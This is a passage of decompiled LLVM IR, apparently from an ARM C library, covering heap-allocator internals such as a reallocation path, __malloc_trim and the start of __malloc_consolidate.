  %v3_12d30 = load i32, i32* %v2_12d30, align 4
  %tmp41 = icmp ugt i32 %v2_12d28, 15
  %v1_12d58 = urem i32 %v3_12d30, 2
  store i32 %v1_12d58, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_12d58, label %dec_label_pc_12d38

dec_label_pc_12d38:                               ; preds = %dec_label_pc_12d28
  %v2_12d3c = or i32 %v1_12d58, %v0_12d3c
  store i32 %v2_12d3c, i32* %r3.global-to-local, align 4
  store i32 %v2_12d3c, i32* %v2_12d30, align 4
  %v0_12d44 = load i32, i32* @sl, align 4
  %v1_12d44 = load i32, i32* %r0.global-to-local, align 4
  %v2_12d44 = add i32 %v1_12d44, %v0_12d44
  store i32 %v2_12d44, i32* %r2.global-to-local, align 4
  %v1_12d48 = add i32 %v2_12d44, 4
  %v2_12d48 = inttoptr i32 %v1_12d48 to i32*
  %v3_12d48 = load i32, i32* %v2_12d48, align 4
  %v1_12d4c = or i32 %v3_12d48, 1
  store i32 %v1_12d4c, i32* %r3.global-to-local, align 4
  store i32 %v1_12d4c, i32* %v2_12d48, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12d58:                               ; preds = %dec_label_pc_12d28
  %v2_12d5c = add i32 %v0_12d30, %v0_12d28
  store i32 %v2_12d5c, i32* %r0.global-to-local, align 4
  %v2_12d60 = or i32 %v1_12d58, %v0_12d28
  store i32 %v2_12d60, i32* %r3.global-to-local, align 4
  %v1_12d64 = or i32 %v2_12d28, 1
  store i32 %v1_12d64, i32* %r2.global-to-local, align 4
  store i32 %v2_12d60, i32* %v2_12d30, align 4
  %v0_12d6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12d6c = load i32, i32* %r0.global-to-local, align 4
  %v2_12d6c = add i32 %v1_12d6c, 4
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v0_12d6c, i32* %v3_12d6c, align 4
  %v0_12d70 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d70 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d70 = add i32 %v1_12d70, %v0_12d70
  store i32 %v2_12d70, i32* %r2.global-to-local, align 4
  %v1_12d74 = add i32 %v2_12d70, 4
  %v2_12d74 = inttoptr i32 %v1_12d74 to i32*
  %v3_12d74 = load i32, i32* %v2_12d74, align 4
  %v1_12d78 = or i32 %v3_12d74, 1
  store i32 %v1_12d78, i32* %r3.global-to-local, align 4
  store i32 %v1_12d78, i32* %v2_12d74, align 4
  %v0_12d80 = load i32, i32* %r0.global-to-local, align 4
  %v1_12d80 = add i32 %v0_12d80, 8
  store i32 %v1_12d80, i32* @r0, align 4
  %v0_12d84 = call i32 @free()
  store i32 %v0_12d84, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12d88

dec_label_pc_12d88:                               ; preds = %dec_label_pc_12d38, %dec_label_pc_12d58
  %v0_12d88 = load i32, i32* @sl, align 4
  %v1_12d88 = add i32 %v0_12d88, 8
  store i32 %v1_12d88, i32* @r4, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12d90:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r1.global-to-local, align 4
  %v4_12d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d98, i32* @r8, align 4
  %v2_12d9c = inttoptr i32 %v1_12bac to i32*
  %v3_12d9c = load i32, i32* %v2_12d9c, align 4
  store i32 %v3_12d9c, i32* @r4, align 4
  %v1_12da0 = add i32 %v4_12d98, 860
  %v2_12da0 = inttoptr i32 %v1_12da0 to i32*
  %v3_12da0 = load i32, i32* %v2_12da0, align 4
  %v1_12da4 = add i32 %v3_12d9c, 4
  %v1_12da8 = add i32 %v3_12da0, -1
  store i32 %v1_12da8, i32* %r2.global-to-local, align 4
  %v2_12dac = add i32 %v1_12da4, %v1_12da8
  %v1_12db0 = load i32, i32* @sb, align 4
  %v2_12db0 = add i32 %v2_12dac, %v1_12db0
  store i32 %v2_12db0, i32* %r3.global-to-local, align 4
  %v2_12db4 = sub i32 0, %v3_12da0
  %v3_12db4 = and i32 %v2_12db0, %v2_12db4
  store i32 %v3_12db4, i32* @r7, align 4
  %v2_12db8 = sub i32 %v3_12db4, %v3_12d9c
  store i32 %v2_12db8, i32* @fp, align 4
  %v9_12dbc = icmp eq i32 %v1_12bb0, %v2_12db8
  br i1 %v9_12dbc, label %dec_label_pc_12e30, label %dec_label_pc_12dc4

dec_label_pc_12dc4:                               ; preds = %dec_label_pc_12d90
  %v2_12dc4 = sub i32 %v1_12bac, %v3_12d9c
  store i32 %v2_12dc4, i32* %r0.global-to-local, align 4
  %v2_12dc8 = add i32 %v3_12d9c, %v1_12bb0
  store i32 %v2_12dc8, i32* %r1.global-to-local, align 4
  store i32 %v3_12db4, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_12dd4 = call i32 @mremap(i32 %v2_12dc4, i32 %v2_12dc8, i32 %v3_12db4, i32 1)
  store i32 %v4_12dd4, i32* %r0.global-to-local, align 4
  %v7_12dd8 = icmp eq i32 %v4_12dd4, -1
  br i1 %v7_12dd8, label %dec_label_pc_12e24, label %dec_label_pc_12de0

dec_label_pc_12de0:                               ; preds = %dec_label_pc_12dc4
  %v1_12de0 = load i32, i32* @r4, align 4
  %v2_12de0 = add i32 %v1_12de0, %v4_12dd4
  store i32 %v2_12de0, i32* %r0.global-to-local, align 4
  %v0_12de4 = load i32, i32* @fp, align 4
  %v1_12de4 = or i32 %v0_12de4, 2
  store i32 %v1_12de4, i32* %r3.global-to-local, align 4
  %v2_12de8 = add i32 %v2_12de0, 4
  %v3_12de8 = inttoptr i32 %v2_12de8 to i32*
  store i32 %v1_12de4, i32* %v3_12de8, align 4
  %v0_12dec = load i32, i32* @r8, align 4
  %v1_12dec = add i32 %v0_12dec, 868
  %v2_12dec = inttoptr i32 %v1_12dec to i32*
  %v3_12dec = load i32, i32* %v2_12dec, align 4
  store i32 %v3_12dec, i32* %r3.global-to-local, align 4
  %v1_12df0 = add i32 %v0_12dec, 880
  %v2_12df0 = inttoptr i32 %v1_12df0 to i32*
  %v3_12df0 = load i32, i32* %v2_12df0, align 4
  store i32 %v3_12df0, i32* %r2.global-to-local, align 4
  %v0_12df4 = load i32, i32* @r6, align 4
  %v2_12df4 = sub i32 %v3_12dec, %v0_12df4
  store i32 %v2_12df4, i32* %r3.global-to-local, align 4
  %v1_12df8 = load i32, i32* @r7, align 4
  %v2_12df8 = add i32 %v1_12df8, %v2_12df4
  store i32 %v2_12df8, i32* %r1.global-to-local, align 4
  %v1_12dfc = add i32 %v0_12dec, 872
  %v2_12dfc = inttoptr i32 %v1_12dfc to i32*
  %v3_12dfc = load i32, i32* %v2_12dfc, align 4
  store i32 %v3_12dfc, i32* %r3.global-to-local, align 4
  %v1_12e04 = add i32 %v0_12dec, 884
  %v2_12e04 = inttoptr i32 %v1_12e04 to i32*
  %v3_12e04 = load i32, i32* %v2_12e04, align 4
  store i32 %v3_12e04, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_12df8, %v3_12df0
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_12de0
  store i32 %v2_12df8, i32* %v2_12df0, align 4
  %v0_12e0c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12e0c.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_12de0, %bb33
  %v1_12e0c = phi i32 [ %v0_12dec, %dec_label_pc_12de0 ], [ %v1_12e0c.pre, %bb33 ]
  %v0_12e0c = phi i32 [ %v2_12df8, %dec_label_pc_12de0 ], [ %v0_12e0c.pre, %bb33 ]
  %v2_12e0c = add i32 %v1_12e0c, 868
  %v3_12e0c = inttoptr i32 %v2_12e0c to i32*
  store i32 %v0_12e0c, i32* %v3_12e0c, align 4
  %v0_12e10 = load i32, i32* %r1.global-to-local, align 4
  %v1_12e10 = load i32, i32* %r3.global-to-local, align 4
  %v2_12e10 = add i32 %v1_12e10, %v0_12e10
  store i32 %v2_12e10, i32* %r1.global-to-local, align 4
  %v1_12e14 = load i32, i32* %r2.global-to-local, align 4
  %v0_12e18 = load i32, i32* %r0.global-to-local, align 4
  %v1_12e18 = add i32 %v0_12e18, 8
  store i32 %v1_12e18, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_12e10, %v1_12e14
  br i1 %tmp43, label %bb35, label %dec_label_pc_12e5c

bb35:                                             ; preds = %bb34
  %v5_12e1c = load i32, i32* @r8, align 4
  %v6_12e1c = add i32 %v5_12e1c, 884
  %v7_12e1c = inttoptr i32 %v6_12e1c to i32*
  store i32 %v2_12e10, i32* %v7_12e1c, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e24:                               ; preds = %dec_label_pc_12dc4
  %v0_12e24 = load i32, i32* @sb, align 4
  %v1_12e24 = add i32 %v0_12e24, 4
  store i32 %v1_12e24, i32* %r3.global-to-local, align 4
  %v0_12e28 = load i32, i32* @r6, align 4
  %v3_12e28 = icmp ult i32 %v0_12e28, %v1_12e24
  br i1 %v3_12e28, label %dec_label_pc_12e38, label %dec_label_pc_12e24.dec_label_pc_12e30_crit_edge

dec_label_pc_12e24.dec_label_pc_12e30_crit_edge:  ; preds = %dec_label_pc_12e24
  %v0_12e30.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_12e30

dec_label_pc_12e30:                               ; preds = %dec_label_pc_12e24.dec_label_pc_12e30_crit_edge, %dec_label_pc_12d90
  %v0_12e30 = phi i32 [ %v0_12e30.pre, %dec_label_pc_12e24.dec_label_pc_12e30_crit_edge ], [ %v0_12b98, %dec_label_pc_12d90 ]
  store i32 %v0_12e30, i32* @r4, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e38:                               ; preds = %dec_label_pc_12e24
  %v1_12e38 = add i32 %v0_12e24, -7
  store i32 %v1_12e38, i32* @r0, align 4
  %v0_12e3c = call i32 @malloc()
  store i32 %v0_12e3c, i32* @r0, align 4
  store i32 %v0_12e3c, i32* @r4, align 4
  %v2_12e40 = icmp eq i32 %v0_12e3c, 0
  br i1 %v2_12e40, label %dec_label_pc_12e5c, label %dec_label_pc_12e48

dec_label_pc_12e48:                               ; preds = %dec_label_pc_12e38
  %v0_12e48 = load i32, i32* @r6, align 4
  %v1_12e48 = add i32 %v0_12e48, -8
  store i32 %v1_12e48, i32* @r2, align 4
  %v0_12e4c = load i32, i32* @r5, align 4
  store i32 %v0_12e4c, i32* @r1, align 4
  %v0_12e50 = call i32 @memcpy()
  %v0_12e54 = load i32, i32* @r5, align 4
  store i32 %v0_12e54, i32* @r0, align 4
  %v0_12e58 = call i32 @free()
  store i32 %v0_12e58, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e5c

dec_label_pc_12e5c:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_12e38, %dec_label_pc_12e30, %dec_label_pc_12d88, %.thread6, %dec_label_pc_12bf8, %dec_label_pc_12e48
  store i32 %v2_12b44, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r2.global-to-local, align 4
  %v4_12e6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 44) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_12e6c)
  br label %dec_label_pc_12e78

dec_label_pc_12e78:                               ; preds = %dec_label_pc_12b78, %dec_label_pc_12b20, %dec_label_pc_12b08, %dec_label_pc_12e5c
  %v0_12e78 = load i32, i32* @r4, align 4
  store i32 %v0_12e78, i32* %r0.global-to-local, align 4
  store i32 %v3_12ae8, i32* @r4, align 4
  store i32 %v6_12ae8, i32* @r5, align 4
  store i32 %v9_12ae8, i32* @r6, align 4
  store i32 %v12_12ae8, i32* @r7, align 4
  store i32 %v15_12ae8, i32* @r8, align 4
  store i32 %v18_12ae8, i32* @sb, align 4
  store i32 %v21_12ae8, i32* @sl, align 4
  store i32 %v24_12ae8, i32* @fp, align 4
  store i32 %v27_12ae8, i32* @lr, align 4
  ret i32 %v0_12e78

; uselistorder directives
  uselistorder i32 %v2_12e10, { 1, 0, 2 }
  uselistorder i32 %v2_12df8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_12dd4, { 1, 0, 2 }
  uselistorder i32 %v3_12db4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_12d58, { 2, 1, 0 }
  uselistorder i32 %v2_12d28, { 1, 0, 2 }
  uselistorder i32 %v0_12cbc, { 1, 0 }
  uselistorder i32 %v0_12c78, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_12bdc, { 0, 2, 1, 3 }
  uselistorder i32 %v2_12bd4, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_12bb8, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_12bb0, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_12bac, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_12b9c, { 1, 0 }
  uselistorder i32 %v0_12b98, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_12b70, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 11, 7, 8, 9, 10, 21, 12, 14, 13, 20, 22, 15, 16, 17, 18, 19, 25, 24, 23, 26, 27 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_12e78, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_12e5c, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_12d88, { 1, 0 }
  uselistorder label %dec_label_pc_12d28, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_12c74, { 1, 2, 0 }
  uselistorder label %dec_label_pc_12c68, { 1, 0 }
  uselistorder label %dec_label_pc_12c64, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_12e8c(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e8c:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v0_12e8c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12e8c, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_12e8c
  store i32 0, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 0)
  %v0_12ea0.pr.pr.pr = load i1, i1* @cpsr_z, align 1
  br i1 %v0_12ea0.pr.pr.pr, label %bb, label %.thread3..thread5_crit_edge

.thread3..thread5_crit_edge:                      ; preds = %.thread3
  %v4_12ea4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread5

bb:                                               ; preds = %.thread3
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread3..thread5_crit_edge, %dec_label_pc_12e8c, %bb
  %v4_12ea4 = phi i32 [ %v4_12ea4.pre, %.thread3..thread5_crit_edge ], [ %arg1, %dec_label_pc_12e8c ], [ 0, %bb ]
  ret i32 %v4_12ea4

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
}

define i32 @__malloc_trim(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v1_12ea8 = add i32 %arg2, 44
  %v2_12ea8 = inttoptr i32 %v1_12ea8 to i32*
  %v3_12ea8 = load i32, i32* %v2_12ea8, align 4
  %v3_12eac = load i32, i32* @r4, align 4
  store i32 %v3_12eac, i32* %stack_var_-20, align 4
  %v12_12eac = load i32, i32* @r7, align 4
  %v1_12eb0 = add i32 %v3_12ea8, 4
  %v2_12eb0 = inttoptr i32 %v1_12eb0 to i32*
  %v3_12eb0 = load i32, i32* %v2_12eb0, align 4
  %v1_12eb4 = add i32 %arg2, 860
  %v2_12eb4 = inttoptr i32 %v1_12eb4 to i32*
  %v3_12eb4 = load i32, i32* %v2_12eb4, align 4
  store i32 %v3_12eb4, i32* @r4, align 4
  %v1_12eb8 = and i32 %v3_12eb0, -4
  store i32 %v1_12eb8, i32* @r6, align 4
  %v1_12ebc = add i32 %v1_12eb8, -17
  %v2_12ec0 = add i32 %v1_12ebc, %v3_12eb4
  store i32 %arg2, i32* @r5, align 4
  %v2_12ecc = sub i32 %v2_12ec0, %arg1
  store i32 %v3_12eb4, i32* %r1.global-to-local, align 4
  %v2_12ed4 = udiv i32 %v2_12ecc, %v3_12eb4
  %v1_12ed8 = add i32 %v2_12ed4, -1
  store i32 %v1_12ed8, i32* %r0.global-to-local, align 4
  %v2_12edc = mul i32 %v1_12ed8, %v3_12eb4
  store i32 %v2_12edc, i32* @r7, align 4
  %v2_12ee0 = icmp eq i32 %v2_12edc, 0
  store i1 %v2_12ee0, i1* @cpsr_z, align 1
  %tmp8 = icmp slt i32 %v2_12edc, 1
  br i1 %tmp8, label %dec_label_pc_12f48, label %dec_label_pc_12ee8

dec_label_pc_12ee8:                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12eec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12eec, i32* %r0.global-to-local, align 4
  %v0_12ef0 = load i32, i32* @r5, align 4
  %v1_12ef0 = add i32 %v0_12ef0, 44
  %v2_12ef0 = inttoptr i32 %v1_12ef0 to i32*
  %v3_12ef0 = load i32, i32* %v2_12ef0, align 4
  %v0_12ef4 = load i32, i32* @r6, align 4
  %v2_12ef4 = add i32 %v0_12ef4, %v3_12ef0
  %v9_12ef8 = icmp eq i32 %v1_12eec, %v2_12ef4
  store i1 %v9_12ef8, i1* @cpsr_z, align 1
  store i32 %v1_12eec, i32* @r4, align 4
  br i1 %v9_12ef8, label %dec_label_pc_12f04, label %dec_label_pc_12f48

dec_label_pc_12f04:                               ; preds = %dec_label_pc_12ee8
  %v0_12f04 = load i32, i32* @r7, align 4
  %v1_12f04 = sub i32 0, %v0_12f04
  store i32 %v1_12f04, i32* %r0.global-to-local, align 4
  %v1_12f08 = call i32 @__GI_sbrk(i32 %v1_12f04)
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12f10 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12f10, i32* %r0.global-to-local, align 4
  %v7_12f14 = icmp eq i32 %v1_12f10, -1
  store i1 %v7_12f14, i1* @cpsr_z, align 1
  br i1 %v7_12f14, label %dec_label_pc_12f48, label %dec_label_pc_12f1c

dec_label_pc_12f1c:                               ; preds = %dec_label_pc_12f04
  %v0_12f1c = load i32, i32* @r4, align 4
  %v2_12f1c = sub i32 %v0_12f1c, %v1_12f10
  store i32 %v2_12f1c, i32* %r0.global-to-local, align 4
  %v9_12f1c = icmp eq i32 %v0_12f1c, %v1_12f10
  store i1 %v9_12f1c, i1* @cpsr_z, align 1
  br i1 %v9_12f1c, label %dec_label_pc_12f48, label %dec_label_pc_12f24

dec_label_pc_12f24:                               ; preds = %dec_label_pc_12f1c
  %v0_12f24 = load i32, i32* @r5, align 4
  %v1_12f24 = add i32 %v0_12f24, 872
  %v2_12f24 = inttoptr i32 %v1_12f24 to i32*
  %v3_12f24 = load i32, i32* %v2_12f24, align 4
  %v1_12f28 = load i32, i32* @r6, align 4
  %v2_12f28 = sub i32 %v1_12f28, %v2_12f1c
  store i32 %v2_12f28, i32* %r2.global-to-local, align 4
  %v1_12f2c = add i32 %v0_12f24, 44
  %v2_12f2c = inttoptr i32 %v1_12f2c to i32*
  %v3_12f2c = load i32, i32* %v2_12f2c, align 4
  store i32 %v3_12f2c, i32* %r1.global-to-local, align 4
  %v2_12f30 = sub i32 %v3_12f24, %v2_12f1c
  %v1_12f34 = or i32 %v2_12f28, 1
  store i32 %v1_12f34, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 %v2_12f30, i32* %v2_12f24, align 4
  %v0_12f40 = load i32, i32* %r2.global-to-local, align 4
  %v1_12f40 = load i32, i32* %r1.global-to-local, align 4
  %v2_12f40 = add i32 %v1_12f40, 4
  %v3_12f40 = inttoptr i32 %v2_12f40 to i32*
  store i32 %v0_12f40, i32* %v3_12f40, align 4
  %v1_12f54.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f4c

dec_label_pc_12f48:                               ; preds = %dec_label_pc_12ee8, %dec_label_pc_12f1c, %dec_label_pc_12f04, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12f4c

dec_label_pc_12f4c:                               ; preds = %dec_label_pc_12f24, %dec_label_pc_12f48
  %v1_12f54 = phi i32 [ %v1_12f54.pre, %dec_label_pc_12f24 ], [ 0, %dec_label_pc_12f48 ]
  %v2_12f50 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_12f50, i32* @r4, align 4
  store i32 %v12_12eac, i32* @r7, align 4
  ret i32 %v1_12f54

; uselistorder directives
  uselistorder i1 %v7_12f14, { 1, 0 }
  uselistorder i32 %v1_12f10, { 2, 1, 0, 3 }
  uselistorder i32 %v3_12eb4, { 0, 2, 1, 3, 4 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 10, 9, 8, 0 }
  uselistorder i32 872, { 1, 0, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg2, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_12f4c, { 1, 0 }
  uselistorder label %dec_label_pc_12f48, { 1, 2, 0, 3 }
}

define i32 @__malloc_consolidate() local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_12f58 = load i32, i32* @r4, align 4
  store i32 %v3_12f58, i32* %stack_var_-36, align 4
  %v0_12f5c = load i32, i32* @r0, align 4
  %v1_12f5c = inttoptr i32 %v0_12f5c to i32*
  %v2_12f5c = load i32, i32* %v1_12f5c, align 4
  store i32 %v2_12f5c, i32* %r3.global-to-local, align 4
  %v2_12f60 = icmp eq i32 %v2_12f5c, 0
  store i32 %v0_12f5c, i32* @r4, align 4
  br i1 %v2_12f60, label %dec_label_pc_13098.preheader, label %dec_label_pc_12f74

dec_label_pc_13098.preheader:                     ; preds = %entry
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_130a025 = add i32 %v0_12f5c, 52
  store i32 %v1_130a025, i32* %r3.global-to-local, align 4
  %v2_130a826 = add i32 %v0_12f5c, 60
  %v3_130a827 = inttoptr i32 %v2_130a826 to i32*
  store i32 %v1_130a025, i32* %v3_130a827, align 4
  %v0_130ac28 = load i32, i32* %r3.global-to-local, align 4
  %v2_130ac29 = add i32 %v0_130ac28, 12
  %v3_130ac30 = inttoptr i32 %v2_130ac29 to i32*
  store i32 %v0_130ac28, i32* %v3_130ac30, align 4
  br label %dec_label_pc_13098.dec_label_pc_13098_crit_edge

dec_label_pc_12f74:                               ; preds = %entry
  %v1_12f74 = and i32 %v2_12f5c, -3
  %v3_12f78 = udiv i32 %v2_12f5c, 8
  store i32 %v3_12f78, i32* %r2.global-to-local, align 4
  store i32 %v1_12f74, i32* %v1_12f5c, align 4
  %v0_12f80 = load i32, i32* @r0, align 4
  %v1_12f80 = add i32 %v0_12f80, -4
  store i32 %v1_12f80, i32* %r3.global-to-local, align 4
  %v1_12f84 = load i32, i32* %r2.global-to-local, align 4
  %v4_12f84 = mul i32 %v1_12f84, 4
  %v5_12f84 = add i32 %v4_12f84, %v1_12f80
  store i32 %v5_12f84, i32* %sb.global-to-local, align 4
  %v1_12f88 = add i32 %v0_12f80, 52
  store i32 %v1_12f88, i32* %r7.global-to-local, align 4
  %v1_12f8c = add i32 %v0_12f80, 4
  store i32 %v1_12f8c, i32* %r6.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_12f94

dec_label_pc_12f94:                               ; preds = %dec_label_pc_13090, %dec_label_pc_12f74
  %v1_1308810 = phi i32 [ %v1_13088, %dec_label_pc_13090 ], [ %v5_12f84, %dec_label_pc_12f74 ]
  %v1_12fa0 = phi i32 [ %v1_13090, %dec_label_pc_13090 ], [ %v1_12f8c, %dec_label_pc_12f74 ]
  %v1_12f94 = inttoptr i32 %v1_12fa0 to i32*
  %v2_12f94 = load i32, i32* %v1_12f94, align 4
  store i32 %v2_12f94, i32* %r1.global-to-local, align 4
  %v2_12f98 = icmp eq i32 %v2_12f94, 0
  br i1 %v2_12f98, label %dec_label_pc_13088, label %dec_label_pc_12fa0

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f94
  %v0_12fa0 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_12fa0, i32* %v1_12f94, align 4
  %v0_12fa4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12fa4

dec_label_pc_12fa4:                               ; preds = %dec_label_pc_1307c, %dec_label_pc_12fa0
  %v0_12fc0 = phi i32 [ %v0_1307c, %dec_label_pc_1307c ], [ %v0_12fa4.pre, %dec_label_pc_12fa0 ]
  %v1_12fa4 = add i32 %v0_12fc0, 4
  %v2_12fa4 = inttoptr i32 %v1_12fa4 to i32*
  %v3_12fa4 = load i32, i32* %v2_12fa4, align 4
  store i32 %v3_12fa4, i32* %r3.global-to-local, align 4
  %v1_12fa8 = and i32 %v3_12fa4, -2
  store i32 %v1_12fa8, i32* %lr.global-to-local, align 4
  %v2_12fac = add i32 %v1_12fa8, %v0_12fc0
  store i32 %v2_12fac, i32* @r0, align 4
  %v1_12fb0 = urem i32 %v3_12fa4, 2
  %v2_12fb0 = icmp eq i32 %v1_12fb0, 0
  %v1_12fb4 = add i32 %v0_12fc0, 8
  %v2_12fb4 = inttoptr i32 %v1_12fb4 to i32*
  %v3_12fb4 = load i32, i32* %v2_12fb4, align 4
  store i32 %v3_12fb4, i32* %sl.global-to-local, align 4
  %v1_12fb8 = add i32 %v2_12fac, 4
  %v2_12fb8 = inttoptr i32 %v1_12fb8 to i32*
  %v3_12fb8 = load i32, i32* %v2_12fb8, align 4
  store i32 %v3_12fb8, i32* %r8.global-to-local, align 4
  br i1 %v2_12fb0, label %dec_label_pc_12fc0, label %dec_label_pc_12ff4

dec_label_pc_12fc0:                               ; preds = %dec_label_pc_12fa4
  %v1_12fc0 = inttoptr i32 %v0_12fc0 to i32*
  %v2_12fc0 = load i32, i32* %v1_12fc0, align 4
  store i32 %v2_12fc0, i32* %r5.global-to-local, align 4
  %v2_12fc4 = sub i32 %v0_12fc0, %v2_12fc0
  store i32 %v2_12fc4, i32* %r3.global-to-local, align 4
  %v1_12fc8 = add i32 %v2_12fc4, 8
  %v2_12fc8 = inttoptr i32 %v1_12fc8 to i32*
  %v3_12fc8 = load i32, i32* %v2_12fc8, align 4
  store i32 %v3_12fc8, i32* %ip.global-to-local, align 4
  %v1_12fcc = add i32 %v3_12fc8, 12
  %v2_12fcc = inttoptr i32 %v1_12fcc to i32*
  %v3_12fcc = load i32, i32* %v2_12fcc, align 4
  store i32 %v3_12fcc, i32* %r1.global-to-local, align 4
  %v9_12fd0 = icmp eq i32 %v3_12fcc, %v2_12fc4
  %v1_12fd4 = add i32 %v2_12fc4, 12
  %v2_12fd4 = inttoptr i32 %v1_12fd4 to i32*
  %v3_12fd4 = load i32, i32* %v2_12fd4, align 4
  store i32 %v3_12fd4, i32* %r2.global-to-local, align 4
  br i1 %v9_12fd0, label %dec_label_pc_12fdc, label %dec_label_pc_13038

dec_label_pc_12fdc:                               ; preds = %dec_label_pc_12fc0
  %v1_12fdc = add i32 %v3_12fd4, 8
  %v2_12fdc = inttoptr i32 %v1_12fdc to i32*
  %v3_12fdc = load i32, i32* %v2_12fdc, align 4
  store i32 %v3_12fdc, i32* %r3.global-to-local, align 4
  %v9_12fe0 = icmp eq i32 %v3_12fdc, %v2_12fc4
  br i1 %v9_12fe0, label %dec_label_pc_12fe8, label %dec_label_pc_13038

dec_label_pc_12fe8:                               ; preds = %dec_label_pc_12fdc
